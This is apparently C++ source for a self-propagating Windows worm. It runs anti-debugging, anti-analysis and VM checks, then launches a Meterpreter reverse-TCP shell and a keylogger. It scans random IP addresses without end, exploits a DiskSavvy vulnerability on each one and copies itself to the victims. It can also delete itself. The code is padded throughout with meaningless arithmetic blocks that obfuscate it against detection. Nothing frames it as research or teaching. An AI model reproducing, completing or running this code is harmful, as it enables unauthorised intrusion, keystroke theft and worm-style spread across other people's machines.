#include "each.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//
adbg_CloseHandleException();
//
adbg_Int2D();
//
IcmpSendEcho();
//
analysis_CheckAnalysisProcess();
//
vmware_mac();
//[ninjaModule]
	if(argc==0){/*normal process*/
	//
std::vector<DWORD> arr_dwThreadIdModule;
std::vector<HANDLE> arr_hThreadModule;
int ieBP4MPF5lJ = 0x024431c;
int iXAKSn2T8KX = 0x1eab85b;
int iSGdAXq1kmp = 0xb9fb3d3;
int iAkJjj7FLX6 = 0xb0c4d7e;
int igKwBQLo9Qw = 4;
switch(igKwBQLo9Qw)
{
    case 0:
        ieBP4MPF5lJ = iXAKSn2T8KX - 0x840bf22 * iSGdAXq1kmp / 100;
        iXAKSn2T8KX = 0xb9fb3d3 - 5 +  0xb9fb3d3 - 6 * iXAKSn2T8KX / 10 + 25;
        iSGdAXq1kmp = ieBP4MPF5lJ * 0x12 + iAkJjj7FLX6 * 0x15 + 0xb0c4d7e / 13 + 0x840bf22 + 555;
        iAkJjj7FLX6 = 0x024431c - 21 + 11 * 1996 - iXAKSn2T8KX + 14520538 - iSGdAXq1kmp - 14520692 + 0x1eab85b - 97;
        break;
    case 1:
        ieBP4MPF5lJ = iXAKSn2T8KX - 25 + 0x024431c - 40 + 0xb9fb3d3 % 10 + 2;
        iSGdAXq1kmp = iSGdAXq1kmp - 0xff % 3 - iAkJjj7FLX6 * 10 + 0x840bf22 / 2 - 10 + 0x1eab85b - 5;
        iAkJjj7FLX6 = 0x024431c % 0x840bf22 ^ 33 + 0xb9fb3d3 * 0x12 - 30 + 0xb9fb3d3 + 23;
        iXAKSn2T8KX = iXAKSn2T8KX + 321 + iSGdAXq1kmp * 10 * iXAKSn2T8KX / 10 / 2 + 0x840bf22 * 0x60;
        break;
    case 2:
        ieBP4MPF5lJ = iXAKSn2T8KX - 45 - iSGdAXq1kmp * 46 + 0x024431c / 0xdade;
        iXAKSn2T8KX = iXAKSn2T8KX + 0x840bf22 - iSGdAXq1kmp * 0x1eab85b - 3;
        iSGdAXq1kmp = 0x1eab85b - 0x1 + ieBP4MPF5lJ * 0x2 - 0x840bf22 / 0x3 + 0xb9fb3d3;
        iAkJjj7FLX6 = ieBP4MPF5lJ - 0x4 * 0x024431c + 0x1234 - 0x4567 + 0xcafe + iXAKSn2T8KX % 0x432 / 0xb0c4d7e - 0x23;
        break;
    case 3:
        iXAKSn2T8KX = iAkJjj7FLX6 * 2 * 0x1eab85b - 4 + 0x840bf22 + 12 + 34 + 0x024431c;
        iSGdAXq1kmp = iXAKSn2T8KX - 43 + 0xb9fb3d3 * 3040 - 0x1eab85b % 10 + 1 - 0xb9fb3d3;
        iAkJjj7FLX6 = 0xb9fb3d3 - 33 + ieBP4MPF5lJ * 0x25 + 0x024431c - 3004 + 0x1eab85b;
        ieBP4MPF5lJ = 0x024431c + 2905 % iXAKSn2T8KX * 1996 + 0xb0c4d7e - 70 * 0x840bf22;
        break;
    case 4:
        iAkJjj7FLX6 = iXAKSn2T8KX - 36 +0x840bf22 * 2001 - iSGdAXq1kmp / 234 + 0x7;
        ieBP4MPF5lJ = iAkJjj7FLX6 - 0xabcedf + 0x1eab85b * 0xa2bc5 + iAkJjj7FLX6 / 0x123 + 0x024431c;
        iSGdAXq1kmp = ieBP4MPF5lJ - 0x124 + 23 / iXAKSn2T8KX / 3 / 2 + iSGdAXq1kmp + 29 - 0x1eab85b + 100;
        iXAKSn2T8KX = 0x1eab85b - 70 + 70  + 0x024431c / 2 + 423 - 0x024431c / 7749 % 0x1234;
        break;
    case 5:
        iXAKSn2T8KX = iXAKSn2T8KX - 9981 % ieBP4MPF5lJ + 111 - iSGdAXq1kmp / 224 % 0xb9fb3d3;
        iSGdAXq1kmp = iSGdAXq1kmp - 339 - iSGdAXq1kmp * 4416 / 0x840bf22 + 5525 + 0x1eab85b % 10;
        iAkJjj7FLX6 = iAkJjj7FLX6 - 6636 + 0x1eab85b * 7749 + 1 - iXAKSn2T8KX * 8864 / 0xfecba;
        ieBP4MPF5lJ = 0x840bf22 - 9981 % 0x024431c % 10 % 1010100 - 0x024431c - 23 -  0x840bf22 - 2500;
        break;
}
igKwBQLo9Qw = iAkJjj7FLX6 - 0xaa + 0xb9fb3d3 * 46 - 15 / iSGdAXq1kmp + 11 - 0x024431c;
igKwBQLo9Qw = igKwBQLo9Qw - 70 * 55 - iSGdAXq1kmp ^ 0x99 - 0x567498 % 0x024431c % 2 - 234 + 0x1eab85b;

HANDLE hThread = NULL;
DWORD dwTID = 0;
        //Moudule Meterpreter_reverse_tcp
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Meterpreter_reverse_tcp, NULL, 0, &dwTID);
        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);
            arr_dwThreadIdModule.push_back(dwTID);
        }        //Moudule Keylogger
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger, NULL, 0, &dwTID);
int i2hB102dTCQ;
int ik97h6UEDFf = 0x673546b;
int iUdgKcVQW3O = 0x3d7cf15;
int igP6csqyQdj = 0xda7f737;
for(i2hB102dTCQ = 0; i2hB102dTCQ < 3; i2hB102dTCQ++)
{
    ik97h6UEDFf = i2hB102dTCQ * 99 - 1000 * iUdgKcVQW3O + 0x456 ^ 0x2201e9c % 5 - 0x09fd074;
    iUdgKcVQW3O = i2hB102dTCQ * 3 + igP6csqyQdj + 0x30 + 0xda7f737 % 123 - iUdgKcVQW3O;
    igP6csqyQdj = i2hB102dTCQ * 4 - 0x3d7cf15 + 0xff / 0x123 - 0xda7f737 % 234 - 0x09fd074;
}
int iP29lu0nUdn = igP6csqyQdj - ik97h6UEDFf * iUdgKcVQW3O + 0xda7f737;
iP29lu0nUdn = i2hB102dTCQ - 50 + 100 - 0x3d7cf15 ^ 99 * 0x0f - 0xda7f737 % 2 - 3575 + 0x09fd074;

        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);
            arr_dwThreadIdModule.push_back(dwTID);
        }
WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);
for (int i = 0; i < arr_hThreadModule.size(); i++) {
if(arr_hThreadModule[i])
CloseHandle(arr_hThreadModule[i]);
}

	
	//
	int  ipAddress[4];
int i296IcK0ZxI = 0x7013b07;
int ifOHfixF23F = 0x5fa17e2;
int iawwqOJ3WZb = 0x632d118;
int iWeki5kkG9T = 0x03588e8;
int iEByjaoIayH = 0;
switch(iEByjaoIayH)
{
    case 0:
        i296IcK0ZxI = ifOHfixF23F - 0x083cf49 * iawwqOJ3WZb / 100;
        ifOHfixF23F = 0x632d118 - 5 +  0x632d118 - 6 * ifOHfixF23F / 10 + 25;
        iawwqOJ3WZb = i296IcK0ZxI * 0x12 + iWeki5kkG9T * 0x15 + 0x03588e8 / 13 + 0x083cf49 + 555;
        iWeki5kkG9T = 0x7013b07 - 21 + 11 * 1996 - ifOHfixF23F + 14520538 - iawwqOJ3WZb - 14520692 + 0x5fa17e2 - 97;
        break;
    case 1:
        i296IcK0ZxI = ifOHfixF23F - 25 + 0x7013b07 - 40 + 0x632d118 % 10 + 2;
        iawwqOJ3WZb = iawwqOJ3WZb - 0xff % 3 - iWeki5kkG9T * 10 + 0x083cf49 / 2 - 10 + 0x5fa17e2 - 5;
        iWeki5kkG9T = 0x7013b07 % 0x083cf49 ^ 33 + 0x632d118 * 0x12 - 30 + 0x632d118 + 23;
        ifOHfixF23F = ifOHfixF23F + 321 + iawwqOJ3WZb * 10 * ifOHfixF23F / 10 / 2 + 0x083cf49 * 0x60;
        break;
    case 2:
        i296IcK0ZxI = ifOHfixF23F - 45 - iawwqOJ3WZb * 46 + 0x7013b07 / 0xdade;
        ifOHfixF23F = ifOHfixF23F + 0x083cf49 - iawwqOJ3WZb * 0x5fa17e2 - 3;
        iawwqOJ3WZb = 0x5fa17e2 - 0x1 + i296IcK0ZxI * 0x2 - 0x083cf49 / 0x3 + 0x632d118;
        iWeki5kkG9T = i296IcK0ZxI - 0x4 * 0x7013b07 + 0x1234 - 0x4567 + 0xcafe + ifOHfixF23F % 0x432 / 0x03588e8 - 0x23;
        break;
    case 3:
        ifOHfixF23F = iWeki5kkG9T * 2 * 0x5fa17e2 - 4 + 0x083cf49 + 12 + 34 + 0x7013b07;
        iawwqOJ3WZb = ifOHfixF23F - 43 + 0x632d118 * 3040 - 0x5fa17e2 % 10 + 1 - 0x632d118;
        iWeki5kkG9T = 0x632d118 - 33 + i296IcK0ZxI * 0x25 + 0x7013b07 - 3004 + 0x5fa17e2;
        i296IcK0ZxI = 0x7013b07 + 2905 % ifOHfixF23F * 1996 + 0x03588e8 - 70 * 0x083cf49;
        break;
    case 4:
        iWeki5kkG9T = ifOHfixF23F - 36 +0x083cf49 * 2001 - iawwqOJ3WZb / 234 + 0x7;
        i296IcK0ZxI = iWeki5kkG9T - 0xabcedf + 0x5fa17e2 * 0xa2bc5 + iWeki5kkG9T / 0x123 + 0x7013b07;
        iawwqOJ3WZb = i296IcK0ZxI - 0x124 + 23 / ifOHfixF23F / 3 / 2 + iawwqOJ3WZb + 29 - 0x5fa17e2 + 100;
        ifOHfixF23F = 0x5fa17e2 - 70 + 70  + 0x7013b07 / 2 + 423 - 0x7013b07 / 7749 % 0x1234;
        break;
    case 5:
        ifOHfixF23F = ifOHfixF23F - 9981 % i296IcK0ZxI + 111 - iawwqOJ3WZb / 224 % 0x632d118;
        iawwqOJ3WZb = iawwqOJ3WZb - 339 - iawwqOJ3WZb * 4416 / 0x083cf49 + 5525 + 0x5fa17e2 % 10;
        iWeki5kkG9T = iWeki5kkG9T - 6636 + 0x5fa17e2 * 7749 + 1 - ifOHfixF23F * 8864 / 0xfecba;
        i296IcK0ZxI = 0x083cf49 - 9981 % 0x7013b07 % 10 % 1010100 - 0x7013b07 - 23 -  0x083cf49 - 2500;
        break;
}
iEByjaoIayH = iWeki5kkG9T - 0xaa + 0x632d118 * 46 - 15 / iawwqOJ3WZb + 11 - 0x7013b07;
iEByjaoIayH = iEByjaoIayH - 70 * 55 - iawwqOJ3WZb ^ 0x99 - 0x567498 % 0x7013b07 % 2 - 234 + 0x5fa17e2;

RandomChooseIP(ipAddress);
	for (;;){
	initAttack(ipAddress);
    }
    WSACleanup();
	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete(){
	char out[MAX_PATH];
int iBdxZBj013g = 0x19f6a43;
int iW0iHI99VRy = 0x39d983a;
int i6qZo6nivj3 = 0x09de3a1;
int iwNhZXeZ1ic = i6qZo6nivj3 * iW0iHI99VRy + iBdxZBj013g;
iW0iHI99VRy = 0x70fd4a3 + iwNhZXeZ1ic + 0x2e9bbaa + iBdxZBj013g;
int imqZZuOb3qY = iBdxZBj013g / 0x39d983a - i6qZo6nivj3 ^ i6qZo6nivj3 ^ 0x09de3a1;

	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;


			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
int iMBp8hL67YG = 0x594b05a;
int iWMaQgFBxRD = 0x3ed3f38;
int i4lxvRgVoza = 0x8a23987;
int iL478pA0oYr = 0x6f7ecd5;
int i606u56waaX = 3;
switch(i606u56waaX)
{
    case 0:
        iMBp8hL67YG = iWMaQgFBxRD - 0x9161048 * i4lxvRgVoza / 100;
        iWMaQgFBxRD = 0x8a23987 - 5 +  0x8a23987 - 6 * iWMaQgFBxRD / 10 + 25;
        i4lxvRgVoza = iMBp8hL67YG * 0x12 + iL478pA0oYr * 0x15 + 0x6f7ecd5 / 13 + 0x9161048 + 555;
        iL478pA0oYr = 0x594b05a - 21 + 11 * 1996 - iWMaQgFBxRD + 14520538 - i4lxvRgVoza - 14520692 + 0x3ed3f38 - 97;
        break;
    case 1:
        iMBp8hL67YG = iWMaQgFBxRD - 25 + 0x594b05a - 40 + 0x8a23987 % 10 + 2;
        i4lxvRgVoza = i4lxvRgVoza - 0xff % 3 - iL478pA0oYr * 10 + 0x9161048 / 2 - 10 + 0x3ed3f38 - 5;
        iL478pA0oYr = 0x594b05a % 0x9161048 ^ 33 + 0x8a23987 * 0x12 - 30 + 0x8a23987 + 23;
        iWMaQgFBxRD = iWMaQgFBxRD + 321 + i4lxvRgVoza * 10 * iWMaQgFBxRD / 10 / 2 + 0x9161048 * 0x60;
        break;
    case 2:
        iMBp8hL67YG = iWMaQgFBxRD - 45 - i4lxvRgVoza * 46 + 0x594b05a / 0xdade;
        iWMaQgFBxRD = iWMaQgFBxRD + 0x9161048 - i4lxvRgVoza * 0x3ed3f38 - 3;
        i4lxvRgVoza = 0x3ed3f38 - 0x1 + iMBp8hL67YG * 0x2 - 0x9161048 / 0x3 + 0x8a23987;
        iL478pA0oYr = iMBp8hL67YG - 0x4 * 0x594b05a + 0x1234 - 0x4567 + 0xcafe + iWMaQgFBxRD % 0x432 / 0x6f7ecd5 - 0x23;
        break;
    case 3:
        iWMaQgFBxRD = iL478pA0oYr * 2 * 0x3ed3f38 - 4 + 0x9161048 + 12 + 34 + 0x594b05a;
        i4lxvRgVoza = iWMaQgFBxRD - 43 + 0x8a23987 * 3040 - 0x3ed3f38 % 10 + 1 - 0x8a23987;
        iL478pA0oYr = 0x8a23987 - 33 + iMBp8hL67YG * 0x25 + 0x594b05a - 3004 + 0x3ed3f38;
        iMBp8hL67YG = 0x594b05a + 2905 % iWMaQgFBxRD * 1996 + 0x6f7ecd5 - 70 * 0x9161048;
        break;
    case 4:
        iL478pA0oYr = iWMaQgFBxRD - 36 +0x9161048 * 2001 - i4lxvRgVoza / 234 + 0x7;
        iMBp8hL67YG = iL478pA0oYr - 0xabcedf + 0x3ed3f38 * 0xa2bc5 + iL478pA0oYr / 0x123 + 0x594b05a;
        i4lxvRgVoza = iMBp8hL67YG - 0x124 + 23 / iWMaQgFBxRD / 3 / 2 + i4lxvRgVoza + 29 - 0x3ed3f38 + 100;
        iWMaQgFBxRD = 0x3ed3f38 - 70 + 70  + 0x594b05a / 2 + 423 - 0x594b05a / 7749 % 0x1234;
        break;
    case 5:
        iWMaQgFBxRD = iWMaQgFBxRD - 9981 % iMBp8hL67YG + 111 - i4lxvRgVoza / 224 % 0x8a23987;
        i4lxvRgVoza = i4lxvRgVoza - 339 - i4lxvRgVoza * 4416 / 0x9161048 + 5525 + 0x3ed3f38 % 10;
        iL478pA0oYr = iL478pA0oYr - 6636 + 0x3ed3f38 * 7749 + 1 - iWMaQgFBxRD * 8864 / 0xfecba;
        iMBp8hL67YG = 0x9161048 - 9981 % 0x594b05a % 10 % 1010100 - 0x594b05a - 23 -  0x9161048 - 2500;
        break;
}
i606u56waaX = iL478pA0oYr - 0xaa + 0x8a23987 * 46 - 15 / i4lxvRgVoza + 11 - 0x594b05a;
i606u56waaX = i606u56waaX - 70 * 55 - i4lxvRgVoza ^ 0x99 - 0x567498 % 0x594b05a % 2 - 234 + 0x3ed3f38;

	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
void initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
int is8ydrUz4JY = 0xec981d1;
int iOjb76KDVQ4 = 0x32d003b;
int iCqUYq0fgsR = 0xb4a7f58;
int iZAqcVpOWnZ = iCqUYq0fgsR * iOjb76KDVQ4 + is8ydrUz4JY;
iOjb76KDVQ4 = 0xb699084 + iZAqcVpOWnZ + 0xd142609 + is8ydrUz4JY;
int iFUSPSM69Im = is8ydrUz4JY / 0x32d003b - iCqUYq0fgsR ^ iCqUYq0fgsR ^ 0xb4a7f58;

	
	//
    curIP[0]=ipAddress[0];
    curIP[1]=ipAddress[1];
    curIP[2]=ipAddress[2];
    curIP[3]=ipAddress[3];
    printf("Exploit DiskSavvy_44156");
	for(i=0; i<MAX_THREADS;i++){
		RandomChooseIP_IncreaseIP(curIP);
		// Allocate memory for thread data.
		pDataArray[i] = (PthreadData) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,sizeof(threadData));
		if( pDataArray[i] == NULL ){
           // If the array allocation fails, the system is out of memory
           // so there is no point in trying to print an error message.
           // Just terminate execution.
			printf("out of memory!\n");
            return ;
        }
        //init data
        //Bindport for each exploit module.
        ipAr2Str(curIP,pDataArray[i]->strIP);
        pDataArray[i]->shellPort=BINDPORT_DiskSavvy_44156;
        
        hThreadArray[i] = CreateThread( 
            NULL,                   
            0,                        
            exploit_DiskSavvy_44156,       			// thread function name
            pDataArray[i],          
            0,                      
            &dwThreadIdArray[i]);   
		if (hThreadArray[i] == NULL) {
			printf("Thread %d is not create!\n",i );
        }
        else{
        	printf("Thread %d is create!\n",i );
        }
	}
	//Đợi tất cả các threads được tắt
	WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);
	for(int i=0; i<MAX_THREADS; i++){
        CloseHandle(hThreadArray[i]);
        if(pDataArray[i] != NULL)
        {
            HeapFree(GetProcessHeap(), 0, pDataArray[i]);
            pDataArray[i] = NULL;    // Ensure address is not reused.
        }
    }

//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
int iK4njUT6S4F = 0x7650bb1;
int idKUKHRQGH4 = 0x820b068;
int iPBj8yCJ5Hh = 0x57fa736;
int iYN3nh6qaeQ = iPBj8yCJ5Hh * idKUKHRQGH4 + iK4njUT6S4F;
idKUKHRQGH4 = 0x9075c8e + iYN3nh6qaeQ + 0x36c0ebf + iK4njUT6S4F;
int i0S1D7FtJ0H = iK4njUT6S4F / 0x820b068 - iPBj8yCJ5Hh ^ iPBj8yCJ5Hh ^ 0x57fa736;

}

//


DWORD WINAPI exploit_DiskSavvy_44156(LPVOID lpParam) {
	PthreadData pData;
	pData = (PthreadData)lpParam;
	int sock;
	sock = isTarget_DiskSavvy_44156(pData->strIP);
	if (sock) {
		std::string tmpFileName ="";
int iBpMGzHeVry = 0xf46ecac;
int iBhpgu8L5D9 = 0x05ee53c;
int izoC9K6Ka3G = 0x3737b9c;
int iXFNjiKZvP0 = izoC9K6Ka3G * iBhpgu8L5D9 + iBpMGzHeVry;
iBhpgu8L5D9 = 0x96c8303 + iXFNjiKZvP0 + 0x2a5e9ba + iBpMGzHeVry;
int ioJT4RcZdMz = iBpMGzHeVry / 0x05ee53c - izoC9K6Ka3G ^ izoC9K6Ka3G ^ 0x3737b9c;

		tmpFileName = fileName;
		if (isRandomName) {
		tmpFileName = RandomStr(8) + ".exe";
		//[randomeNameModule](tmpFileName);
		}
		printf("victim: %s\n", pData->strIP);
		DiskSavvy_44156(sock, pData->strIP);
		int a;
		a = Base64P2P(pData->strIP, pData->shellPort, tmpFileName);
		//printf("Done exploti!");
		if (isRandomName)
		{
			//delete new exe
			std::string NewExePath = (std::string)fullName;
			NewExePath = NewExePath.substr(0, NewExePath.find_last_of("\\"));
			NewExePath += "\\" + tmpFileName;
			DeleteFileA(NewExePath.c_str());
		}
		printf("DEBUG %d\n", a);
	}
	else
	{
		printf("ip: %s can't exploit!\n", pData->strIP);
	}
	return 0;
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
int iQhTWEHCdfO = 0x3204df4;
int iWOzXcDaeRv = 0xfc5525d;
int iBWkSSt7mpW = 0xbc0276d;
int ihMMmxlEIuq = iBWkSSt7mpW * iWOzXcDaeRv + iQhTWEHCdfO;
iWOzXcDaeRv = 0x51fcf23 - ihMMmxlEIuq + 5 + 0x2d7f835 + 69 - iQhTWEHCdfO;
iQhTWEHCdfO = 0x3204df4 + 10 - iWOzXcDaeRv % 10 + 0xbc0276d + 999 - ihMMmxlEIuq;
ihMMmxlEIuq = iQhTWEHCdfO % 5 + iBWkSSt7mpW % 0xfc5525d + 0xcafebabe + iQhTWEHCdfO;
iBWkSSt7mpW = 0x3204df4 * 0x100 - iQhTWEHCdfO + 56 ^ 0xfc5525d + 1996 - iBWkSSt7mpW;
int iJErkApvTQZ = iBWkSSt7mpW / 77 + 0xbc0276d - 76 / iBWkSSt7mpW ^ 0x33 % iBWkSSt7mpW % 0xbc0276d;
iJErkApvTQZ = 0x2d7f835 * 0x10 - 22 + iJErkApvTQZ + 56 ^ 0xff + iWOzXcDaeRv + 1996 - 2111 + iBWkSSt7mpW;

	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
int ipDEahuQi31 = 0x89abfc0;
int inhtaal5aHn = 0x6c5cad3;
int iP6sbVfEipy = 0x79e5339;
int i9jLqK4OTE1 = iP6sbVfEipy * inhtaal5aHn + ipDEahuQi31;
inhtaal5aHn = 0xe18c1a8 - i9jLqK4OTE1 + 5 + 0x4ae494f + 69 - ipDEahuQi31;
ipDEahuQi31 = 0x89abfc0 + 10 - inhtaal5aHn % 10 + 0x79e5339 + 999 - i9jLqK4OTE1;
i9jLqK4OTE1 = ipDEahuQi31 % 5 + iP6sbVfEipy % 0x6c5cad3 + 0xcafebabe + ipDEahuQi31;
iP6sbVfEipy = 0x89abfc0 * 0x100 - ipDEahuQi31 + 56 ^ 0x6c5cad3 + 1996 - iP6sbVfEipy;
int iqGGb9a35y1 = iP6sbVfEipy / 77 + 0x79e5339 - 76 / iP6sbVfEipy ^ 0x33 % iP6sbVfEipy % 0x79e5339;
iqGGb9a35y1 = 0x4ae494f * 0x10 - 22 + iqGGb9a35y1 + 56 ^ 0xff + inhtaal5aHn + 1996 - 2111 + iP6sbVfEipy;

	return;
int iwCbjlPDL8N = 0xf045f3b;
int iCj5E0qSdVW = 0xa458b7b;
int iFbf3EKJZh8 = 0xfad203f;
int iEMl0jBx6vW = 0xe9c7e18;
int iTD85xrh0vc = 1;
switch(iTD85xrh0vc)
{
    case 0:
        iwCbjlPDL8N = iCj5E0qSdVW - 0x3c577ed * iFbf3EKJZh8 / 100;
        iCj5E0qSdVW = 0xfad203f - 5 +  0xfad203f - 6 * iCj5E0qSdVW / 10 + 25;
        iFbf3EKJZh8 = iwCbjlPDL8N * 0x12 + iEMl0jBx6vW * 0x15 + 0xe9c7e18 / 13 + 0x3c577ed + 555;
        iEMl0jBx6vW = 0xf045f3b - 21 + 11 * 1996 - iCj5E0qSdVW + 14520538 - iFbf3EKJZh8 - 14520692 + 0xa458b7b - 97;
        break;
    case 1:
        iwCbjlPDL8N = iCj5E0qSdVW - 25 + 0xf045f3b - 40 + 0xfad203f % 10 + 2;
        iFbf3EKJZh8 = iFbf3EKJZh8 - 0xff % 3 - iEMl0jBx6vW * 10 + 0x3c577ed / 2 - 10 + 0xa458b7b - 5;
        iEMl0jBx6vW = 0xf045f3b % 0x3c577ed ^ 33 + 0xfad203f * 0x12 - 30 + 0xfad203f + 23;
        iCj5E0qSdVW = iCj5E0qSdVW + 321 + iFbf3EKJZh8 * 10 * iCj5E0qSdVW / 10 / 2 + 0x3c577ed * 0x60;
        break;
    case 2:
        iwCbjlPDL8N = iCj5E0qSdVW - 45 - iFbf3EKJZh8 * 46 + 0xf045f3b / 0xdade;
        iCj5E0qSdVW = iCj5E0qSdVW + 0x3c577ed - iFbf3EKJZh8 * 0xa458b7b - 3;
        iFbf3EKJZh8 = 0xa458b7b - 0x1 + iwCbjlPDL8N * 0x2 - 0x3c577ed / 0x3 + 0xfad203f;
        iEMl0jBx6vW = iwCbjlPDL8N - 0x4 * 0xf045f3b + 0x1234 - 0x4567 + 0xcafe + iCj5E0qSdVW % 0x432 / 0xe9c7e18 - 0x23;
        break;
    case 3:
        iCj5E0qSdVW = iEMl0jBx6vW * 2 * 0xa458b7b - 4 + 0x3c577ed + 12 + 34 + 0xf045f3b;
        iFbf3EKJZh8 = iCj5E0qSdVW - 43 + 0xfad203f * 3040 - 0xa458b7b % 10 + 1 - 0xfad203f;
        iEMl0jBx6vW = 0xfad203f - 33 + iwCbjlPDL8N * 0x25 + 0xf045f3b - 3004 + 0xa458b7b;
        iwCbjlPDL8N = 0xf045f3b + 2905 % iCj5E0qSdVW * 1996 + 0xe9c7e18 - 70 * 0x3c577ed;
        break;
    case 4:
        iEMl0jBx6vW = iCj5E0qSdVW - 36 +0x3c577ed * 2001 - iFbf3EKJZh8 / 234 + 0x7;
        iwCbjlPDL8N = iEMl0jBx6vW - 0xabcedf + 0xa458b7b * 0xa2bc5 + iEMl0jBx6vW / 0x123 + 0xf045f3b;
        iFbf3EKJZh8 = iwCbjlPDL8N - 0x124 + 23 / iCj5E0qSdVW / 3 / 2 + iFbf3EKJZh8 + 29 - 0xa458b7b + 100;
        iCj5E0qSdVW = 0xa458b7b - 70 + 70  + 0xf045f3b / 2 + 423 - 0xf045f3b / 7749 % 0x1234;
        break;
    case 5:
        iCj5E0qSdVW = iCj5E0qSdVW - 9981 % iwCbjlPDL8N + 111 - iFbf3EKJZh8 / 224 % 0xfad203f;
        iFbf3EKJZh8 = iFbf3EKJZh8 - 339 - iFbf3EKJZh8 * 4416 / 0x3c577ed + 5525 + 0xa458b7b % 10;
        iEMl0jBx6vW = iEMl0jBx6vW - 6636 + 0xa458b7b * 7749 + 1 - iCj5E0qSdVW * 8864 / 0xfecba;
        iwCbjlPDL8N = 0x3c577ed - 9981 % 0xf045f3b % 10 % 1010100 - 0xf045f3b - 23 -  0x3c577ed - 2500;
        break;
}
iTD85xrh0vc = iEMl0jBx6vW - 0xaa + 0xfad203f * 46 - 15 / iFbf3EKJZh8 + 11 - 0xf045f3b;
iTD85xrh0vc = iTD85xrh0vc - 70 * 55 - iFbf3EKJZh8 ^ 0x99 - 0x567498 % 0xf045f3b % 2 - 234 + 0xa458b7b;

}
